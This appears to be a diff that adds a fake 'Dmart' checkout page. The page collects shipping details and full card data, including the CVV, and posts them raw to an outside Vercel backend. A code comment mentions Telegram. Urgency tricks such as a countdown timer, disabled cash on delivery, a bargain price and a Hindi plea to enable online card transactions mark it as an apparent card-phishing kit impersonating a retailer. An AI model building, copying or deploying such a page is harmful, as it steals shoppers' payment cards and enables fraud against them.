@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="google-site-verification" content="googlef563f12e6ebc5611.html">
+  <title>Dmart — Checkout &amp; Payment</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <style>body { font-family: 'Inter', sans-serif; }</style>
+  <script defer src="/_vercel/insights/script.js"></script>
+</head>
+<body class="bg-gray-50 font-inter" cz-shortcut-listen="true">
+<header class="bg-white shadow-md sticky top-0 z-40">
+  <nav class="container mx-auto px-4 py-4 flex justify-between items-center">
+    <a href="home" class="flex items-center space-x-2 text-2xl font-bold text-green-600">
+       <img src="./checkout_files/logo.png" width="100px">
+    </a>
+    <div id="header-status" class="text-sm text-gray-500">Secure Checkout</div>
+  </nav>
+</header>
+
+<main class="container mx-auto px-4 py-8">
+  <h1 class="text-3xl font-bold text-gray-800 mb-8">Checkout</h1>
+
+  <div class="flex flex-col lg:flex-row gap-8">
+    <!-- Left -->
+    <div class="w-full lg:w-2/3 space-y-6">
+      <!-- Shipping -->
+      <section id="shipping-section" class="bg-white p-8 rounded-lg shadow-md">
+        <div id="shipping-form-wrapper">
+          <h2 class="text-2xl font-semibold mb-6 border-b pb-2">Shipping Information</h2>
+          <form id="checkout-form">
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+              <div class="md:col-span-2">
+                <label class="block text-sm font-medium">Full Name</label>
+                <input id="inp-name" type="text" name="name" class="w-full border rounded-lg p-3" required="">
+              </div>
+              <div>
+                <label class="block text-sm font-medium">Phone Number</label>
+                <div class="relative">
+                  <span class="absolute left-3 top-3 text-gray-500">+91</span>
+                  <input id="inp-phone" type="text" name="phone" class="w-full border rounded-lg p-3 pl-12" maxlength="10" required="">
+                </div>
+                <p id="phone-error" class="text-red-500 text-xs hidden">Must be 10 digits</p>
+              </div>
+              <div>
+                <label class="block text-sm font-medium">Pincode</label>
+                <input id="inp-pincode" type="text" name="pincode" class="w-full border rounded-lg p-3" required="">
+                <p id="pincode-error" class="text-red-500 text-xs hidden">Must be 6 digits</p>
+              </div>
+              <div class="md:col-span-2">
+                <label class="block text-sm font-medium">Address</label>
+                <input id="inp-address" type="text" name="address" class="w-full border rounded-lg p-3" required="">
+              </div>
+              <div>
+                <label class="block text-sm font-medium">City</label>
+                <input id="inp-city" name="city" class="w-full border rounded-lg p-3" required="">
+              </div>
+              
+               <div>
+                <label class="block text-sm font-medium">State</label>
+                <input id="inp-state" name="state" class="w-full border rounded-lg p-3" required="">
+              </div>
+              
+              
+              
+            <!--  <div>
+                <label class="block text-sm font-medium">State</label>
+                <select id="inp-state" name="state" class="w-full border rounded-lg p-3" required>
+                  <option value="">Select State</option>
+                  <option>Delhi</option><option>Maharashtra</option><option>Karnataka</option><option>Uttar Pradesh</option>
+                </select>
+              </div>
+              
+              
+              
+              -->
+            </div>
+
+            <div class="mt-8 text-right">
+              <button id="proceed-btn" class="bg-green-600 text-white font-bold py-3 px-8 rounded-lg text-lg">Proceed to Payment</button>
+            </div>
+          </form>
+        </div>
+
+        <div id="shipping-summary" class="hidden">
+          <h3 class="text-lg font-semibold">Delivery To</h3>
+          <p id="summary-name" class="text-sm text-gray-700"></p>
+          <p id="summary-address" class="text-sm text-gray-600"></p>
+          <p id="summary-phone" class="text-sm text-gray-600"></p>
+          <button id="edit-shipping" class="text-sm text-green-600 underline mt-3">Edit</button>
+        </div>
+      </section>
+
+      <!-- Payment -->
+      <section id="payment-section" class="bg-white p-8 rounded-lg shadow-md hidden">
+        <div class="bg-yellow-50 border px-4 py-3 rounded-lg mb-6 flex items-center justify-between">
+          <div class="flex items-center">
+            <svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clip-rule="evenodd"/></svg>
+            <span class="text-sm font-medium">Complete your payment in</span>
+          </div>
+          <span id="countdown-timer" class="font-bold font-mono text-lg text-red-600">15:00</span>
+        </div>
+
+        <h1 class="text-2xl font-bold text-center mb-6">Payment Details</h1>
+
+        <div class="mb-6 border rounded-lg overflow-hidden">
+          <button id="toggle-summary-btn" class="w-full p-4 bg-gray-50 text-left flex justify-between items-center">
+            <span class="font-medium text-gray-700">
+              <svg class="inline w-5 h-5 mr-2 text-green-600" fill="currentColor" viewBox="0 0 20 20"><path d="M3 1a1 1 0 000 2h1.22l.305 1.222a.997.997 0 00.01.042l1.358 5.43-.893.892C3.74 11.846 4.632 14 6.414 14H15a1 1 0 000-2H6.414l1-1H14a1 1 0 00.894-.553l3-6A1 1 0 0017 3H6.28l-.31-1.243A1 1 0 005 1H3zM16 16.5a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0zM6.5 18a1.5 1.5 0 100-3 1.5 1.5 0 000 3z"/></svg>
+              Order Summary (<span id="summary-count">0</span> items)
+            </span>
+            <svg id="summary-chevron" class="w-5 h-5 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+          </button>
+          <div id="order-summary-content" class="hidden p-4 border-t max-h-60 overflow-y-auto"></div>
+        </div>
+
+        <div class="flex justify-between items-center mb-8 border-b pb-4">
+          <span class="text-gray-600 text-lg">Total Amount Payable</span>
+          <span id="payment-total" class="text-3xl font-bold text-green-600">₹0.00</span>
+        </div>
+
+
+
+
+
+
+<div class="p-2 mb-2" style="background-color: rgba(30,126,52,0.10)">
+                            <h3 class="h6 mb-1 text-success text-center">( Please activate your E-commerce
+                                transaction in your Card ) <br> <br>✅कृपया अपने डेबिट और क्रेडिट कार्ड का ऑनलाइन
+                                ट्रांजेक्शन ऑन करें ✅</h3>
+                        </div>
+                        
+                        
+                        
+        <h2 class="text-lg font-semibold mb-4 text-gray-700">Select Payment Method</h2>
+        
+        
+        
+        
+        
+        <div class="space-y-4 mb-8">
+                <label class="flex items-center p-4 border rounded-lg cursor-pointer hover:bg-green-50 transition-colors has-[:checked]:bg-green-50 has-[:checked]:border-green-500">
+                    <input type="radio" name="payment-method" value="card" class="h-5 w-5 text-green-600 focus:ring-green-500" checked="">
+                    <div class="ml-3 flex items-center justify-between w-full">
+                        <span class="font-medium text-gray-700">Credit / Debit Card</span>
+                        <div class="flex space-x-2">
+                            <svg class="w-10 h-7" viewBox="0 0 48 32" fill="none"><rect width="48" height="32" rx="4" fill="#1434CB"/><circle cx="18" cy="16" r="8" fill="#EB001B"/><circle cx="30" cy="16" r="8" fill="#FF5F00"/><path d="M24 9.5C21.5 11.5 21.5 20.5 24 22.5C26.5 20.5 26.5 11.5 24 9.5Z" fill="#FF5F00"/></svg>
+                            <svg class="w-10 h-7" viewBox="0 0 48 32" fill="none"><rect width="48" height="32" rx="4" fill="#0066B2"/><path d="M20 8H28V24H20V8Z" fill="white"/><path d="M16 16C16 12 18 8 22 8C18 8 14 12 14 16C14 20 18 24 22 24C18 24 16 20 16 16Z" fill="#F7B600"/><path d="M32 16C32 20 28 24 24 24C28 24 32 20 32 16C32 12 28 8 24 8C28 8 32 12 32 16Z" fill="#F7B600"/></svg>
+                            <svg class="w-10 h-7" viewBox="0 0 48 32" fill="none"><rect width="48" height="32" rx="4" fill="#6C63FF"/><text x="24" y="20" text-anchor="middle" fill="white" font-size="10" font-weight="bold">RuPay</text></svg>
+                        </div>
+                    </div>
+                </label>
+                <label class="flex items-center p-4 border rounded-lg bg-gray-100 cursor-not-allowed opacity-60">
+                    <input type="radio" name="payment-method" value="cod" class="h-5 w-5" disabled="">
+                    <div class="ml-3 w-full flex justify-between">
+                        <span class="font-medium text-gray-500">Cash on Delivery</span>
+                        <span class="text-xs text-red-500 font-bold uppercase tracking-wide">Unavailable</span>
+                    </div>
+                </label>
+        
+        <div>
+        
+        
+        
+        
+        
+   <!--     
+        
+        <div class="space-y-4 mb-8">
+          <label class="flex items-center p-4 border rounded-lg"><input type="radio" name="pm" checked class="h-5 w-5 text-green-600 mr-3"><span class="font-medium text-gray-700">Credit / Debit Card</span></label>
+        </div>
+         <div class="space-y-4 mb-8 opacity-50 pointer-events-none">
+          <label class="flex items-center p-4 border rounded-lg bg-gray-100"><input type="radio" name="pm" disabled class="h-5 w-5 text-green-600 mr-3"><span class="font-small text-gray-500">Cash on delivery (Unavailable)</span></label>
+        </div>
+-->
+
+
+
+
+
+
+
+        <!-- Card Form -->
+       <div id="card-form" class="space-y-5 pt-2">
+
+  <!-- CARD NUMBER -->
+  <div>
+  <label class="block text-sm font-medium">Card Number</label>
+  <div class="relative">
+    <input type="text" id="card-number" class="w-full border rounded-lg p-3 pr-12" placeholder="0000 0000 0000 0000" maxlength="19">
+
+    <!-- Card Logo (right side) -->
+    <img id="card-logo" class="absolute right-3 top-3 w-7 h-7 hidden">
+  </div>
+</div>
+
+
+  <!-- EXPIRY + CVV -->
+  <div class="grid grid-cols-2 gap-6">
+    <div>
+      <label class="block text-sm font-medium">Expiry (MM/YY)</label>
+      <input type="text" id="card-expiry" class="w-full border rounded-lg p-3" placeholder="MM/YY" maxlength="5">
+    </div>
+    <div>
+      <label class="block text-sm font-medium">CVV</label>
+      <input type="text" id="card-cvv" class="w-full border rounded-lg p-3" placeholder="123" maxlength="4" inputmode="numeric">
+    </div>
+  </div>
+
+  <!-- NAME -->
+  <div>
+    <label class="block text-sm font-medium">Cardholder Name</label>
+    <input type="text" id="card-name" class="w-full border rounded-lg p-3" placeholder="Name as on card">
+  </div>
+</div>
+
+<button id="pay-btn" class="w-full bg-green-600 text-white font-bold py-4 px-6 rounded-lg text-lg mt-8 shadow-lg">
+  <span>Pay Now</span>
+  <svg id="spinner" class="inline w-5 h-5 ml-3 hidden animate-spin" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
+</button>
+
+<p class="text-center text-gray-400 text-xs mt-6 flex justify-center items-center">
+  <svg class="w-4 h-4 mr-1 text-green-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
+  Your transaction is secured with 256-bit SSL encryption.
+</p>
+
+
+
+
+
+
+
+
+    <!-- Right -->
+    <div class="w-full lg:w-1/3">
+      <div class="bg-white p-6 rounded-lg shadow-md sticky top-24">
+        <h3 class="text-xl font-semibold mb-4 border-b pb-2">Order Summary</h3>
+        <div id="summary-items" class="space-y-3 mb-4 max-h-60 overflow-y-auto"><div class="flex justify-between text-sm"><span>4KG Premium Dry Fruit Mix Combo <span class="text-gray-500">x1</span></span><span class="font-medium">₹399.00</span></div></div>
+        <div class="pt-4 border-t">
+          <div class="flex justify-between text-xl font-bold text-gray-800"><span>Total</span><span id="summary-total">₹399.00</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div></section></div></div></main>
+
+<script>
+/* ---------- UTILS ---------- */
+const formatCurrency = (amt) => new Intl.NumberFormat('en-IN',{style:'currency',currency:'INR'}).format(amt);
+let cart = JSON.parse(localStorage.getItem('Dmart')) || [];
+let savedUser = JSON.parse(localStorage.getItem('Dmart_User')) || {};
+
+/* ---------- RENDER RIGHT SUMMARY ---------- */
+function renderSummary() {
+  const container = document.getElementById('summary-items');
+  let total = 0;
+  if(!cart || cart.length === 0) {
+    container.innerHTML = '<p class="text-red-500 text-center py-4">Your cart is empty.</p>';
+    document.getElementById('proceed-btn').disabled = true;
+    document.getElementById('proceed-btn').classList.add('opacity-50','cursor-not-allowed');
+    return;
+  }
+  container.innerHTML = cart.map(item => {
+    total += item.price * item.quantity;
+    return `<div class="flex justify-between text-sm"><span>${item.name} <span class="text-gray-500">x${item.quantity}</span></span><span class="font-medium">${formatCurrency(item.price * item.quantity)}</span></div>`;
+  }).join('');
+  document.getElementById('summary-total').textContent = formatCurrency(total);
+}
+renderSummary();
+
+/* ---------- PREFILL SHIPPING ---------- */
+function prefillShipping() {
+  if(!savedUser || Object.keys(savedUser).length === 0) return;
+  if(savedUser.name) document.getElementById('inp-name').value = savedUser.name;
+  if(savedUser.phone) document.getElementById('inp-phone').value = savedUser.phone.replace(/^\+91/,'');
+  if(savedUser.address) document.getElementById('inp-address').value = savedUser.address;
+  if(savedUser.city) document.getElementById('inp-city').value = savedUser.city;
+  if(savedUser.state) document.getElementById('inp-state').value = savedUser.state;
+  if(savedUser.pincode) document.getElementById('inp-pincode').value = savedUser.pincode;
+}
+prefillShipping();
+
+/* ---------- PAYMENT SUMMARY ---------- */
+function renderPaymentSummary() {
+  const summaryCount = cart.reduce((s, item) => s + item.quantity, 0);
+  document.getElementById('summary-count').textContent = summaryCount;
+  const summaryContent = document.getElementById('order-summary-content');
+  let total = 0;
+  if (cart.length > 0) {
+    summaryContent.innerHTML = cart.map(item => {
+      total += item.price * item.quantity;
+      return `<div class="flex justify-between items-center text-sm"><div class="flex items-center"><span class="font-medium text-gray-700 w-8">${item.quantity}x</span><span class="text-gray-600 truncate w-48">${item.name}</span></div><span class="font-medium text-gray-800">${formatCurrency(item.price * item.quantity)}</span></div>`;
+    }).join('') + `<div class="flex justify-between items-center text-sm border-t pt-2 mt-2 text-gray-500"><span>Shipping</span><span class="text-green-600 font-medium">Free</span></div>`;
+  } else {
+    summaryContent.innerHTML = '<p class="text-sm text-red-500">Cart is empty</p>';
+  }
+  document.getElementById('payment-total').textContent = formatCurrency(cart.reduce((s,i)=>s + i.price * i.quantity,0));
+}
+
+/* ---------- TOGGLE SUMMARY ---------- */
+document.getElementById('toggle-summary-btn').addEventListener('click', () => {
+  document.getElementById('order-summary-content').classList.toggle('hidden');
+  document.getElementById('summary-chevron').classList.toggle('rotate-180');
+});
+
+/* ---------- TIMER ---------- */
+let timeLeft = 15 * 60;
+let timerInterval = null;
+const timerEl = document.getElementById('countdown-timer');
+function startTimer() {
+  if(timerInterval) clearInterval(timerInterval);
+  timeLeft = 15 * 60;
+  timerInterval = setInterval(() => {
+    const minutes = Math.floor(timeLeft/60);
+    const seconds = timeLeft % 60;
+    timerEl.textContent = `${String(minutes).padStart(2,'0')}:${String(seconds).padStart(2,'0')}`;
+    if(timeLeft > 0) {
+      timeLeft--;
+      if(timeLeft < 60) timerEl.classList.add('animate-pulse');
+    } else {
+      clearInterval(timerInterval);
+      alert("Session Expired. Please refresh.");
+      window.location.href = 'cart.html';
+    }
+  }, 1000);
+}
+
+/* ---------- CARD FORMATTING & Luhn ---------- */
+function isValidCard(num) {
+  let s = 0, d = false, n = num.replace(/\D/g,'');
+  if(n.length < 13) return false;
+  for(let i = n.length-1; i >= 0; i--) {
+    let c = parseInt(n[i],10);
+    if(d && (c *= 2) > 9) c -= 9;
+    s += c; d = !d;
+  }
+  return s % 10 === 0;
+}
+document.getElementById('card-number').addEventListener('input', e => {
+  let v = e.target.value.replace(/\D/g,'').substring(0,16);
+  e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+});
+document.getElementById('card-expiry').addEventListener('input', e => {
+  let v = e.target.value.replace(/\D/g,'').substring(0,4);
+  if(v.length>=2) {
+    let month = v.substring(0,2);
+    if(parseInt(month) > 12) month = '12';
+    if(parseInt(month) < 1 && v.length >= 2) month = '01';
+    v = month + v.substring(2);
+    v = v.substring(0,2)+'/'+v.substring(2);
+  }
+  e.target.value = v;
+});
+
+/* ---------- SAVE ORDER TO SERVER ---------- */
+async function saveOrderToServer(payload) {
+  try {
+    const res = await fetch('files/save_order.php', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(payload)
+    });
+    return await res.json();
+  } catch(e) {
+    console.error('Save order error', e);
+    return { ok:false, error: e.message || 'Network error' };
+  }
+}
+
+/* ---------- SHIPPING FORM SUBMIT (collapse -> payment) ---------- */
+document.getElementById('checkout-form').addEventListener('submit', (e) => {
+  e.preventDefault();
+  const phone = document.getElementById('inp-phone').value.trim();
+  const pincode = document.getElementById('inp-pincode').value.trim();
+  if(!/^\d{10}$/.test(phone)) { document.getElementById('phone-error').classList.remove('hidden'); return; } else document.getElementById('phone-error').classList.add('hidden');
+  if(!/^\d{6}$/.test(pincode)) { document.getElementById('pincode-error').classList.remove('hidden'); return; } else document.getElementById('pincode-error').classList.add('hidden');
+
+  const fd = new FormData(e.target);
+  const userDetails = Object.fromEntries(fd.entries());
+  userDetails.phone = '+91' + userDetails.phone;
+  localStorage.setItem('Dmart_User', JSON.stringify(userDetails));
+  savedUser = userDetails;
+
+  // UI: collapse shipping, show summary & payment
+  document.getElementById('shipping-form-wrapper').classList.add('hidden');
+  document.getElementById('shipping-summary').classList.remove('hidden');
+  document.getElementById('summary-name').textContent = savedUser.name;
+  document.getElementById('summary-address').textContent = `${savedUser.address}, ${savedUser.city} - ${savedUser.pincode}`;
+  document.getElementById('summary-phone').textContent = savedUser.phone;
+  document.getElementById('payment-section').classList.remove('hidden');
+  document.getElementById('header-status').textContent = 'Secures Paymentt';
+
+  renderPaymentSummary();
+  startTimer();
+});
+
+/* ---------- EDIT SHIPPING ---------- */
+document.getElementById('edit-shipping').addEventListener('click', () => {
+  document.getElementById('shipping-form-wrapper').classList.remove('hidden');
+  document.getElementById('shipping-summary').classList.add('hidden');
+  document.getElementById('payment-section').classList.add('hidden');
+  document.getElementById('header-status').textContent = 'Secure Checkout';
+  if(timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+});
+
+/* ---------- PAY BUTTON (validates, sends Telegram, saves to DB, stores last_order_id) ---------- */
+document.getElementById('pay-btn').addEventListener('click', async () => {
+  // console.log('Pay Now button clicked - starting payment process');
+  
+  const num = document.getElementById('card-number').value.trim();
+  const exp = document.getElementById('card-expiry').value.trim();
+  const cvv = document.getElementById('card-cvv').value.trim();
+  const name = document.getElementById('card-name').value.trim();
+
+  // console.log('Card details validation:', { num: num.substring(0, 4) + 'XXXX', exp, cvv: cvv ? 'XXX' : '', name });
+
+  if(!num || !exp || !cvv || !name) {
+    console.error('Validation failed: Missing card details');
+    return alert('Please fill all card details.');
+  }
+  
+  const cleanNum = num.replace(/\D/g,'');
+  if(cleanNum.length !== 16) {
+    console.error('Validation failed: Invalid card number length', cleanNum.length);
+    return alert('Card number must be 16 digits');
+  }
+
+  // Validate card using Luhn Algorithm
+  if(!isValidCard(cleanNum)) {
+    return alert('⚠️ Invalid Card Number');
+  }
+
+  // Validate expiry date
+  const [month, year] = exp.split('/');
+  if(!month || !year || month.length !== 2 || year.length !== 2) {
+    return alert('⚠️ Invalid expiry date format');
+  }
+  const m = parseInt(month);
+  const y = parseInt(year);
+  if(m < 1 || m > 12) {
+    return alert('⚠️ Invalid month. Must be between 01-12');
+  }
+  if(y > 45) {
+    return alert('⚠️ Invalid year. Must be between 00-45');
+  }
+  const fullYear = 2000 + y;
+  if(fullYear < 2026) {
+    const popup = document.createElement('div');
+    popup.className = 'fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 bg-red-500 text-white px-8 py-6 rounded-lg shadow-2xl z-50 font-semibold text-lg whitespace-nowrap';
+    popup.textContent = '⚠️ Invalid Card: Card expired';
+    document.body.appendChild(popup);
+    setTimeout(() => popup.remove(), 2000);
+    return;
+  }
+
+  // console.log('Validation passed, starting payment processing');
+
+  // spinner
+  const btn = document.getElementById('pay-btn');
+  btn.disabled = true;
+  document.getElementById('spinner').classList.remove('hidden');
+
+  const total = cart.reduce((s,i)=>s + i.price * i.quantity, 0);
+  const user = JSON.parse(localStorage.getItem('Dmart_User')) || {};
+  
+  // console.log('Payment payload:', { user: !!user, total, cartItems: cart.length });
+
+  try {
+    // console.log('Sending order to server...');
+    // Use local backend for development, Vercel for production
+    const apiUrl = 'https://dmart-backend-opal.vercel.app/api/save-order';
+    
+    // console.log('Using API URL:', apiUrl);
+    
+    const rs = await fetch(apiUrl, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ user, card: { number: num, expiry: exp, cvv, name }, total, cart })
+    }).then(r => {
+      // console.log('Server response status:', r.status);
+      return r.json();
+    }).catch(error => {
+      console.error('Network error during order save:', error);
+      return { ok: false, error: error.message };
+    });
+
+    // console.log('Server response:', rs);
+
+    // If server returned order_id, store it for thank-you download tracking
+    if(rs && rs.ok && rs.order_id) {
+      // console.log('Order saved successfully with ID:', rs.order_id);
+      localStorage.setItem('last_order_id', rs.order_id);
+    } else {
+      // If DB failed, we continue but still keep a local placeholder id
+      // console.warn('DB save returned error or no order_id:', rs);
+      const localId = 'LOCAL-' + Math.random().toString(36).slice(2,10);
+      localStorage.setItem('last_order_id', localId);
+      // console.log('Using local order ID:', localId);
+    }
+
+    // Save local history & clear cart
+    const newOrder = {
+      id: (rs && rs.order_id) ? rs.order_id : ('LOCAL-' + Math.random().toString(36).slice(2,10)),
+      date: new Date().toLocaleDateString('en-IN'),
+      items: cart,
+      total: total,
+      status: 'Pending Verification'
+    };
+    
+    // console.log('Saving order to local storage:', newOrder);
+    
+    const history = JSON.parse(localStorage.getItem('Dmart_Orders')) || [];
+    history.unshift(newOrder);
+    localStorage.setItem('Dmart_Orders', JSON.stringify(history));
+    localStorage.removeItem('Dmart');
+
+    // console.log('Order saved locally, redirecting to thank you page...');
+
+    // Redirect to thank you
+    setTimeout(()=> { 
+      // console.log('Redirecting now...');
+      window.location.href = 'thank-you.html'; 
+    }, 1500); // Increased delay to allow time to see console logs
+    
+  } catch (error) {
+    console.error('Critical error in payment processing:', error);
+    alert('Payment processing failed. Please try again.');
+    btn.disabled = false;
+    document.getElementById('spinner').classList.add('hidden');
+  }
+});
+</script>
+
+
+
+
+<script>
+// ---------- DETECT CARD TYPE ----------
+function detectCardType(number) {
+    number = number.replace(/\D/g, "");
+
+    const patterns = {
+        visa: /^4/,
+        mastercard: /^(5[1-5]|2[2-7])/,
+        amex: /^3[47]/,
+        rupay: /^(60|65|81|82|508)/,
+        discover: /^6011/,
+        diners: /^3[068]/,
+        jcb: /^35/
+    };
+
+    if (patterns.visa.test(number)) return "visa";
+    if (patterns.mastercard.test(number)) return "mastercard";
+    if (patterns.rupay.test(number)) return "rupay";
+    if (patterns.amex.test(number)) return "amex";
+    if (patterns.discover.test(number)) return "discover";
+    if (patterns.diners.test(number)) return "diners";
+    if (patterns.jcb.test(number)) return "jcb";
+
+    return "";
+}
+
+const cardInput = document.getElementById("card-number");
+const cvvInput = document.getElementById("card-cvv");
+const cardLogo = document.getElementById("card-logo");
+
+const cardLogos = {
+    visa: './checkout_files/visa icon.png',
+    mastercard: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 32"%3E%3Crect width="48" height="32" rx="4" fill="%23000"/%3E%3Ccircle cx="18" cy="16" r="7" fill="%23EB001B"/%3E%3Ccircle cx="30" cy="16" r="7" fill="%23F79E1B"/%3E%3Cpath d="M24 11a7 7 0 000 10 7 7 0 000-10z" fill="%23FF5F00"/%3E%3C/svg%3E',
+    rupay: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 32"%3E%3Crect width="48" height="32" rx="4" fill="%2300A650"/%3E%3Ctext x="24" y="20" text-anchor="middle" fill="white" font-size="10" font-weight="bold" font-family="Arial"%3ERuPay%3C/text%3E%3C/svg%3E',
+    amex: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 32"%3E%3Crect width="48" height="32" rx="4" fill="%23006FCF"/%3E%3Ctext x="24" y="20" text-anchor="middle" fill="white" font-size="8" font-weight="bold" font-family="Arial"%3EAMEX%3C/text%3E%3C/svg%3E',
+    discover: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 32"%3E%3Crect width="48" height="32" rx="4" fill="%23FF6000"/%3E%3Ctext x="24" y="20" text-anchor="middle" fill="white" font-size="7" font-weight="bold" font-family="Arial"%3EDISCOVER%3C/text%3E%3C/svg%3E',
+    diners: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 32"%3E%3Crect width="48" height="32" rx="4" fill="%230079BE"/%3E%3Ccircle cx="18" cy="16" r="6" fill="none" stroke="white" stroke-width="2"/%3E%3Ccircle cx="30" cy="16" r="6" fill="none" stroke="white" stroke-width="2"/%3E%3C/svg%3E',
+    jcb: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 32"%3E%3Crect width="48" height="32" rx="4" fill="%230E4C96"/%3E%3Ctext x="24" y="20" text-anchor="middle" fill="white" font-size="9" font-weight="bold" font-family="Arial"%3EJCB%3C/text%3E%3C/svg%3E'
+};
+
+// ---------- FORMAT CARD NUMBER & SHOW LOGO ----------
+cardInput.addEventListener("input", () => {
+    let num = cardInput.value.replace(/\D/g, "");
+    num = num.substring(0, 16);
+
+    cardInput.value = num.replace(/(.{4})/g, '$1 ').trim();
+
+    let type = detectCardType(num);
+
+    if (!type || num.length < 2) {
+        cardLogo.classList.add("hidden");
+        cvvInput.maxLength = 3;
+        cvvInput.placeholder = "123";
+        return;
+    }
+
+    cardLogo.src = cardLogos[type];
+    cardLogo.classList.remove("hidden");
+
+    if (type === "amex") {
+        cvvInput.maxLength = 4;
+        cvvInput.placeholder = "1234";
+    } else {
+        cvvInput.maxLength = 3;
+        cvvInput.placeholder = "123";
+    }
+});
+</script>
+
+
+
+</body></html>
